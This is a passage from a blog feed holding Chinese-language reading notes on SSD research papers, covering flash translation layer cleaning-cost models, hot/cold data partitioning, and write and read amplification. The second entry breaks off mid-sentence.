将擦除的页面降级为冷区域。这样的策略会导致次优性能。清理时，我们可以区分页面是否因区域占用而被清理，还是因为它确实具有较低的更新频率。更新时，当页面足够热以证明将其推广到更热的区域时，我们可以识别精确的阈值。</li></ul><h2 id="符号和假设"><a href="#符号和假设" class="headerlink" title="符号和假设"></a>符号和假设</h2><ul><li><code>α</code>: 过度配置：用户空间和额外空间的比例。</li><li><code>μ</code>: 设备利用率：用户空间和总空间。</li></ul><p>清理块（又称垃圾收集）的开销由有效且需要在擦除块之前重新定位的页面分数给出。表示为<code>Pgc</code>：可解释为百分比或概率，块中的有效页数 &#x2F; 块的总页数。</p><p>清理开销 &#x3D; 需要重新定位的有效页面数量 &#x2F; 块中的总页面数量<br>$$<br>P_{gc}&#x3D;\frac{P_{valid}}{P_{total}}<br>$$<br>擦除操作带来的好处，即回收的可用空间量，是块的容量减去页面迁移所消耗的空间。因此，我们定义写放大的概念，即每次用户写入时<code>FTL</code>写入的额外物理空间。<br>$$<br>WA&#x3D;1+\frac{P_{gc}}{1-P_{gc}}&#x3D;1+\frac{P_{valid}}{P_{total}-P_{valid}}<br>$$<br>其中，<code>1</code>代表了存储新写入的用户数据所需的物理写入，只能通过压缩或去重才能避免。第二项代表了由于非原地写入而产生的实际清理开销。我们同样把第二项称为<code>GC (Garbage Collection)</code>。</p><p> <strong><code>I/O</code>工作负载：</strong>这篇文章对<code>k-model I/O</code>工作负载的变体进行建模。<code>k-model I/O</code>工作负载代表一种更新分布，其中任何页面的更新频率只能有<code>k</code>个可能的离散值<code>(fi,...,fk)</code>。我们将具有给定更新频率的所有页面称为一个更新集。每个更新集都有一个相关的大小，定义为总用户数据的一部分<code>si</code>，并接收到总更新的一部分<code>fsi</code>。</p><p><code>k-model</code>工作负载有两个优势：</p><ul><li>建模简单。</li><li>足够通用，可以近似模拟真实的<code>I/O</code>工作负载。通过将具有相似更新频率的页面”分箱”组合在一起，可以通过<code>k</code>模态工作负载来抽象一般的<code>I/O</code>工作负载。正如我们将看到，页面可以安全地分组到具有指数级增常更新频率的箱中。</li></ul><h3 id="模型假设"><a href="#模型假设" class="headerlink" title="模型假设"></a>模型假设</h3><p>建模清理开销时，做出如下假设：</p><ul><li>我们排除了顺序写入。利用顺序写入模式是一个正交的主题，相对容易实现，例如通过检测顺序写入模式并将更新存储在同一个擦除块中。如果同样的页面再次顺序写入，该块被置为无效，并且可以在不进行任何数据移动的情况下被擦除。然而，我们的模型支持任何偏斜的<code>I/O</code>工作负载。</li><li>我们只建模长期<code>FTL</code>擦除开销。新格式化的<code>SSD</code>没有立即的清理开销，因为所有闪存块都被擦除并可用于写入，这导致好的但是短暂的写入性能。</li></ul><h2 id="FTL清理策略"><a href="#FTL清理策略" class="headerlink" title="FTL清理策略"></a><code>FTL</code>清理策略</h2><h3 id="随机更新-1-Modal-Distribution"><a href="#随机更新-1-Modal-Distribution" class="headerlink" title="随机更新(1-Modal Distribution)"></a>随机更新<code>(1-Modal Distribution)</code></h3><p>假设一个由单页更新组成的随机更新工作负载。所有页面拥有相同的更新概率，因此，数据放置并不重要，例如，将任何页面存储在一起没有任何好处，清除成本只依赖于块选择策略。</p><p>贪婪策略：选择具有最少有效页的块进行更新。由于所有页面的更新频率相同，并且更新不相关，因此贪婪政策是最佳的。</p><p>我们首先对<code>LRU</code>和<code>Greedy policy</code>进行建模，表明<code>LRU</code>清洁政策接近最佳是实际重要性的。</p><p>闪存设备可以考虑为圆形日志结构，其中更新附加到尾部，每当需要空间时，清理总是从日志头开始，写入最古老的块。</p><p>在完整的日志循环中，写入操作要么是由页面迁移引起的，要么是由实际用户更新引起的。</p><p>在每次用户更新时，一个给定页面不会被置为无效的概率是，其中<code>N</code>是页面的总数：<br>$$<br>1-\frac{1}{N}<br>$$<br>而清理过程不会产生无效化（一旦有效页面被重新定位，一个块就会立即被擦除）。因此，一个给定页面在整个日志循环期间保持有效的概率是它在一次更新中避免无效化的概率的总用户更新次数的幂。</p><p>假设总共有<code>(1 + α) * N</code>个物理页，<code>Pgc</code>的一部分会因为擦除过程中的重新分配被”浪费”，而<code>(1 - Pgc)</code>的物理页面事实上存储新的用户数据。因此，我们可以通过方程的极限推导出<code>Pgc</code>。<br>$$<br>P_{gc}&#x3D;(1-\frac{1}{N})^{N(1+α)(1-p_{gc})}<br>$$<br>当<code>N</code>足够大的时候，我们应用欧拉极限<code>Euler&#39;s limit</code> :<br>$$<br>P_{gc}&#x3D;e^{-(1+α)(1-p_{gc})}<br>$$<br>它接受解析解：<br>$$<br>P_{gc}&#x3D;-\frac{W(-(1+α)e^{-(1+α)})}{1+α}<br>$$<br>上面公式中的<code>W</code>是<code>Lambert-W</code>函数，即:<br>$$<br>z&#x3D;W(z)e^{W(z)}<br>$$<br>的解。<code>W</code>不能表示为代数函数的组合。然而，<code>W</code>可以进行数值计算（例如通过泰勒展开），尽管从实际角度来看，这相当繁琐。</p><p>因此我们提出一种简单的近似方法。注意到：<br>$$<br>-(1+α)e^{-α}⊂(-e^{-1},0)\quadα ∈ R^+<br>$$<br>因此我们需要在一个相当小的范围内近似<code>W</code>。最终得到代数近似：<br>$$<br>P_{gc}\approx\frac{e^{-0.9\alpha}}{1+\alpha}<br>$$<br>方程<code>(9)</code>提供了在分配额外容量和清理性能之间的定量权衡，它表明，随着超额配置的增加，<code>Pgc</code>的减少速度略快于指数级。</p><h4 id="贪婪清除策略Greedy-cleaning-policy"><a href="#贪婪清除策略Greedy-cleaning-policy" class="headerlink" title="贪婪清除策略Greedy cleaning policy"></a>贪婪清除策略<code>Greedy cleaning policy</code></h4><p>为了量化贪婪清洁政策的好处，我们需要考虑超过方程4给出的平均pgc值：我们还需要对有效页面在擦除块上的分布进行建模。</p><p>对于<code>LRU</code>和<code>Greedy</code>策略：无论何时我们需要回收空间时，我们选择具有最少有效页数量的最老写入的<code>B</code>个块。当<code>B = 1</code>时，清除策略变为<code>LRU</code>；当<code>B = (1 + α) N / C</code>时变为贪婪策略。建模时考虑如下：</p><ul><li><p>概率分布函数<code>Pgc</code>，简称为<code>(PDF)</code>，是关于<code>α</code>过量配置的函数。</p><p>块中的有效页数量遵循二项分布，块中任何两个页拥有相等且无关的<code>Pgc</code>概率是有效的。因此，一个块有<code>k</code>个有效页面的概率是：<br>$$<br>p(k)&#x3D;\begin{pmatrix}<br>C\<br>k\<br>\end{pmatrix}\cdot {P_{pc}}^k \cdot (1-p_{gc})^{C-k}<br>$$<br>请注意，<code>Pgc(α)</code>由方程4给出，概率分布函数<code>PDF(Pgc)</code>是一个向量：<br>$$<br>PDF(p_{gc})&#x3D;\begin{bmatrix}p(C) &amp; p(C - 1) &amp; … &amp; p(0)\end{bmatrix}<br>$$<br>标准差为：<br>$$<br>stddev&#x3D;\sqrt{C\cdot p_{gc}\cdot (1-p_{gc})}<br>$$</p></li><li></li><li><p>PDF更改为块在清洁窗口中位置的函数。</p><p>使页面失效的过程可以用以下马尔可夫链过渡矩阵表示：<br>$$<br>M&#x3D;\begin{bmatrix}<br>\frac{N-C}{N} &amp; \frac{C}{N} &amp; … &amp; 0 \<br>. &amp; . &amp; . &amp; \<br>&amp; &amp; \frac{1}{N} &amp; \frac{C-1}{N}\<br>0 &amp; 0 &amp; 0 &amp; 1\<br>\end{bmatrix}<br>$$<br><code>M(i, i)</code> 代表一个块在更新时所有页面避免无效化的概率，并且该块保持有<code> C - i</code> 个有效页面的同一状态。<code>M(i, i + 1)</code> 代表迁移到下一个状态的概率，这个状态定义为有 <code>C - i - 1</code> 个有效页面。在 <code>n</code> 次更新后的 <code>PDF</code> 变化简单地表示为<br>$$<br>PDF_{new} &#x3D; PDF_{old} · M^n<br>$$<br>而更新的次数 n 反过来由块在清理窗口中的位置决定。</p></li><li><p>如何计算通过增加<code>B</code>窗口获得的收益。</p><p>我们无法推断出分析公式来给出<code>Pgc</code>和窗口大小<code>B</code>之间的简明关系，但是，<code>Pgc</code>减少可以计算为：<br>$$<br>Benefit&#x3D;\sum_{i&#x3D;2}^{B}(PDF_{old}-PDF_i)\cdot \begin{bmatrix}<br>C &amp; C-1 &amp;…&amp; 1 &amp; 0\end{bmatrix}’<br>$$<br>“Benefit” 指的是通过设置大小为 B 的清理窗口，从而节省的平均有效页面数量，这些页面不需要重新定位。请注意，所有的术语都是向量，而且最后一个元素代表马尔可夫链模型状态的有效页面数量。</p><p>最终结果表明窗口贪婪策略只有很少的好处。</p><p>于是我们总结<code>Greedy</code>和<code>Window-Greedy</code>策略对于随机更新来说不是必须的。</p></li></ul><h3 id="2-modal-Distribution"><a href="#2-modal-Distribution" class="headerlink" title="2-modal Distribution"></a>2-modal Distribution</h3><p>我们模拟两种不同情况下双模态工作负载（页面要么是热的，要么是冷的）的清理开销：a) 当页面是随机共置的，b) 当页面根据它们的更新频率分开存储时。</p><h4 id="随机数据放置"><a href="#随机数据放置" class="headerlink" title="随机数据放置"></a>随机数据放置</h4><p>页面更新的频率只有<code>f1</code>和<code>f2</code>两种情况，两种集合的大小为<code>s1</code>和<code>s2</code>，并让<code>fr = f1 / f2</code>为两个更新集之间的相对页面更新频率。我们假设页面是随机配置的，并且使用LRU策略（即日志结构化数据放置）清理块。</p><p>设<code>Pgc1</code>、<code>Pgc2</code>为更新集1和更新集2的页面分别在垃圾收集中有效的概率，并设<code>Pavg</code>为随机选择的页面有效的概率。<code>Pgc1</code>、<code>Pgc2</code>可以使用与第4.1节类似的逻辑表示，经过一系列操作后我们得到：<br>$$<br>\frac{log(p_{gc1})}{log(p_{gc2})}&#x3D;f_r ⇔ p_{gc1}&#x3D;p_{gc2}^{f_r}<br>$$<br>公式(16)总结了两组的有效页面概率之间的关系，并表明在垃圾收集中必须重新放置较冷的页面的概率与<code>fr-th</code>根向1增长。例如，如果集合2是冷<code>cold</code>则<code>fr &gt; 1</code>且<br>$$<br>P_{gc2}&#x3D;\sqrt[fr]{p_{gc1}}<br>$$<br><code>Pavg</code>和<code>pgc1</code>,<code>pgc2</code>之间的关系是从以下条件下推导出的，即总清洁开销等于与每个更新集相关的部分清洁开销的总和。也即：<br>$$<br>p_{avg}&#x3D;1-\frac{(1-p_{gc1})(1-p_{gc2})}{f_{s1}(1-p_{gc2})+f_{s2}(1-p_{gc1})}<br>$$<br><strong>解析近似：</strong>为了便于理解清理开销，我们还提出了一个封闭公式近似，用于<code>Pavg</code>，<code>Pgc1</code>，<code>Pgc2</code>。该近似基于对每个更新集的页面数量计数。如果我们在某一时刻抓取日志结构<code>log-structure</code>中的所有页面，会发现有<br>$$<br>\frac{s_1+s_2}{1+\alpha}<br>$$<br>比例的页面包含集合1和集合2的有效用户页。</p><h4 id="基于频率的数据放置策略"><a href="#基于频率的数据放置策略" class="headerlink" title="基于频率的数据放置策略"></a>基于频率的数据放置策略</h4><p>直观上，根据更新频率，可以通过分页减少清洁开销，正如之前的工作所观察到的那样。在第4.2.1节中，我们确定了热数据和冷数据之间的相对差异，根据更新频率来分离页面是合理的。<strong>接下来，我们将展示如何优化分离数据并计算最低清洁开销。</strong></p><p>规定<br>$$<br>\beta \cdot N \quad (\beta &lt; \alpha)<br>$$<br>为分配给第一个日志结构的过度配置页数。剩余的过度配置分配给第二个日志结构。</p><p>由于每个页面有单一的更新频率，新的页面更新概率可以用方程<code>(9)</code>来计算。</p><p>全局清洁开销，<code>GCavg</code>，是每个区域的单个清洁开销的总和，按区域的更新频率加权：<br>$$<br>GC_{tot}&#x3D;f_{s1}\frac{p_{gc1}}{1-p_{gc1}}+f_{s2}\frac{p_{gc2}}{1-p_{gc2}}<br>$$<br>由于<code>Pgc1</code>，<code>Pgc2</code>依赖于额外的空间分配，剩余的挑战是如何将额外的容量预算最优地分配给每个更新集合。即如何选择β以减小<code>GCtot</code>。</p><p>通过对方程10求导，我们找到了使 <code>GC(β)</code> 达到全局最小值的 <code>β</code> （<code>GC(β)</code> 是一个凸函数）。将方程3代入方程10之后，我们将导数表示为：<br>$$<br>\frac{\partial GC_{tot}}{\partial \beta} &#x3D; \frac{f_{s1} W_1}{s_1(W_1 + 1)(W_1 + z_1)} - \frac{f_{s2} W_2}{s_2(W_2 + 1)(W_2 + z_2)}<br>$$<br>使用简化符号：<br>$$<br>z_1&#x3D;1+\frac{\beta}{s_1};\<br>z_2&#x3D;1+\frac{\alpha-\beta}{s_2};\<br>W_i&#x3D;W(-z_ie^{z_i});\<br>$$<br>最优点<code>β</code>是导数为0的点，也即当：<br>$$<br>f_r&#x3D;\frac{W_1}{(W_1+1)(W_1+z_1)}&#x3D;\frac{W_2}{(W_2+1)(W_2+z_2)}<br>$$<br>影响最优点<code>β</code>的参数有三个：</p><ul><li>过度配置<code>α</code></li><li>相对更新频率<code>fr</code></li><li>更新集合的大小<code>si</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Improving-Flash-Write-Performance-by-Using-Update-Frequency&quot;&gt;&lt;a href=&quot;#Improving-Flash-Write-Performance-by-Using-Update-Frequency&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSD-based Workload Characteristics and Their Performance Implications</title>
    <link href="http://example.com/2024/01/17/SSD-based-Workload-Characteristics-and-Their-Performance-Implications/"/>
    <id>http://example.com/2024/01/17/SSD-based-Workload-Characteristics-and-Their-Performance-Implications/</id>
    <published>2024-01-17T03:11:02.000Z</published>
    <updated>2024-01-27T11:49:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSD-based-Workload-Characteristics-and-Their-Performance-Implications"><a href="#SSD-based-Workload-Characteristics-and-Their-Performance-Implications" class="headerlink" title="SSD-based Workload Characteristics and Their Performance Implications"></a>SSD-based Workload Characteristics and Their Performance Implications</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction:"></a>Introduction:</h2><h3 id="SSD的优化目标与硬盘不同："><a href="#SSD的优化目标与硬盘不同：" class="headerlink" title="SSD的优化目标与硬盘不同："></a>SSD的优化目标与硬盘不同：</h3><ul><li>SSD上组织数据，目标是最大化并行性和最小化垃圾收集开销。</li><li>SSD优化以数据移动为目标，而不是数据放置。</li><li>允许进行复杂的优化并快速调整工作负载的变化。</li></ul><h3 id="与SSD设计和性能相关的特征："><a href="#与SSD设计和性能相关的特征：" class="headerlink" title="与SSD设计和性能相关的特征："></a>与SSD设计和性能相关的特征：</h3><ul><li>温度范围。</li><li>逻辑局部性（概括了简单的空间局部性和顺序性）。</li><li>增加SSD页面大小的敏感性。</li></ul><h3 id="将上述特征与SSD性能相关联："><a href="#将上述特征与SSD性能相关联：" class="headerlink" title="将上述特征与SSD性能相关联："></a>将上述特征与SSD性能相关联：</h3><ul><li>写放大：设备上写入的数据量与应用程序写入的数据量之间的比率与高尾延迟和降低的耐用性相关。</li><li>读放大：从SSD读取的数据量与应用程序请求的数据量之间的比率。</li><li>闪存读取成本：包括从闪存介质读取数据并将其传输到控制器的低级延迟。</li></ul><h3 id="发现证实了建议的特征与SSD设计和优化的相关性："><a href="#发现证实了建议的特征与SSD设计和优化的相关性：" class="headerlink" title="发现证实了建议的特征与SSD设计和优化的相关性："></a>发现证实了建议的特征与SSD设计和优化的相关性：</h3><ul><li>增加 SSD 内逻辑分区的数量可减少写入放大。 然而，这需要大量的开销并且带来收益递减。 最佳分区数量小于以前研究中建议的数量。</li><li>读取放大随着页面大小的增加而增加，并且主要取决于请求大小的分布。 然而，对地址范围的重复访问会显着降低读取放大。 这种减少的程度可以通过逻辑空间局部性来估计。</li><li>通过有选择地从大页中读取部分字节范围，可以有效降低闪存读取成本。 我们简单的贪婪算法足以达到此目的，展示了向主机导出“部分读取”接口的潜在好处。</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background:"></a>Background:</h2><h3 id="工作负载"><a href="#工作负载" class="headerlink" title="工作负载"></a>工作负载</h3><ul><li>the University of Massachusetts (SPC traces) </li><li>Microsoft Research at Cambridge</li><li>Microsoft production servers</li><li>Florida International University</li></ul><p>我们关注这些工作负载上的普遍属性</p><ul><li>Request arrival time (relative to the beginning of the trace) 请求到达时间，与trace的开始相关。</li><li>Volume number 存储体编号</li><li>Request size (in byte) 请求大小</li><li>I&#x2F;O operation I&#x2F;O操作（读或写）</li></ul><h3 id="温度范围"><a href="#温度范围" class="headerlink" title="温度范围"></a>温度范围</h3><p>工作负载偏斜传统上被用来通过使用缓存来优化性能。如果缓存足够大能存储应用程序的工作集，则大部分请求不需要访问底层设备。在这种情况下，常用的经验法则，比如80-20法则——它指出80%的请求访问了20%的数据——经常被用来估计工作负载所需的缓存大小。因此，传统的分析通过评估工作集大小或热数据（频繁访问的数据）的数量来描述工作负载的偏斜程度。虽然这些对于优化硬盘和缓存性能是足够的，但对于固态硬盘（SSD）的优化，更详细的分析可能会带来更多的好处。</p><p>在闪存层的设计中，通过分离冷热数据到不同的逻辑分区中可以减小写放大，垃圾回收开销，和单元磨损。这样的分类同样也可以优化磨损均衡和页面重用。因此，许多闪存将数据分类到两个区域。</p><p>Stoica和Ailamaki的研究表明，只要每个分区内的访问偏斜足够小，就可以将几种不同的温度级别的数据分组到同一个分区中，而不会增加写放大的现象。我们基于这一分析，根据工作负载所需的最小分区数量来进行特征描述。然后我们量化了在最佳数量过高时分配较少分区的成本。我们特别感兴趣的是常见的两个分区情况，用于热数据和冷数据。</p><h4 id="表征温度范围"><a href="#表征温度范围" class="headerlink" title="表征温度范围"></a>表征温度范围</h4><p>​当一个逻辑页被写入SSD时，FTL将原来的物理地址标记为无效的然后选择芯片和平面，根据条带和负载均匀策略将一页写入。然后将页写入平面中的一个活跃块（一个已经被擦除但还没有完全写满的块）。将数据分别放入N个逻辑分区需要每个平面有N个活跃块。</p><p>​根据<code>Stoica 和 Ailamaki</code>的定义，<code>fi</code>表示页面<code>i</code>的更新频率。理想的情况下，每个分区将包含具有相同更新频率的页面。这显然是不切实际的，因为现代芯片每个平面只有512个块。相反，具有多个访问频率的逻辑页面被分组到每个分区（读者认为这里的一个分区<code>partition</code>就是一个块<code>block</code>）中。<code>fr(p)</code>表示分区<code>p</code>中的更新频率比，这是存储在<code>p</code>中的页面的最大和最小更新频率之间的比率。<code>fr</code>表示所有分区的最大比率。参考[57]中的理论分析表明，确保<code>fr ≤ 2</code>足以最小化垃圾回收开销。然而，这个结果没有考虑到维护所需分区数量的开销。</p><p>​为了确定在现代芯片组织下这种优化是否现实，我们计算了确保<code>fr ≤ 2</code>所需的最小分区数量。我们根据更新的频率对每个工作负载中的逻辑扇区进行排名，并贪婪的将他们分配给不同的分区：：我们从第一个分区开始，分配给它更新频率最高的页面<code>i</code>以及所有满足<code>fj ≥ fi /2</code>的页面<code>&#123;j&#125;</code>。然后我们将下一个页面分配给第二个分区，以此类推。我们在分析基于硬件驱动器<code>(HDD)</code>的迹象和基于固态硬盘<code>SSD</code>的<code>RocksDB</code>迹象时，分别使用了512字节和4KB的扇区大小，以反映这些迹象中观察到的访问粒度。我们将在第4节中更详细地讨论访问粒度。</p><p>​我们的结果显示，所需的最少分区数量在2到16之间变化，并且在不同类别之间有所不同。图<code>1(a)</code>展示了每个类别的第25、50和第75百分位数，垂直线显示了每个类别所需的最小和最大分区数量（键值类别包括单个RocksDB迹象，因此用一个小圆圈表示）。例如，对于75%的数据库管理系统（DBMS）工作负载和键值工作负载，9个分区就足够了，而75%的邮件服务器工作负载至少需要14个分区。我们在不同限制下的<code>fr</code>上重复了这个实验。不出所料，位了维持更低的比例，需要更多的分区。所需最少分区数量从3到26不等，用于<code>fr ≤ 1.5</code>，当<code>fr ≤ 3</code>时，需要2到11个分区。</p><p>​<strong>发现一：</strong>实现写入放大的理论下限需要大量的分区。</p><p>​为了理解这些结果的影响，考虑最先进的企业<code>SSD</code>，每个平面有521个块和<code>28%</code>的过度配置空间。每个平面将有400个可用的逻辑块。因此为了维持<code>16</code>个分区，<code>4%</code>的块需要作为活跃块，平均<code>2%</code>的逻辑容量将无法利用。除了这种开销外，还必须考虑在<code>SSD</code>的<code>RAM</code>中将页面维护和分类为几个分区的成本。</p><p>​SSD设计可能会限制分区数量，以利用专用硬件，或最大限度地减少分区开销。为了评估次优分区的影响，我们重复上述过程以穷尽地找到<code>fmin(N)</code>–贪婪分区方案导致N个预定数量的分区时的最低比率。图<code>1(c)</code>展示了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSD-based-Workload-Characteristics-and-Their-Performance-Implications&quot;&gt;&lt;a href=&quot;#SSD-based-Workload-Characteristics-and-Their-Perfor</summary>
      
    
    
    
    
  </entry>
  
</feed>
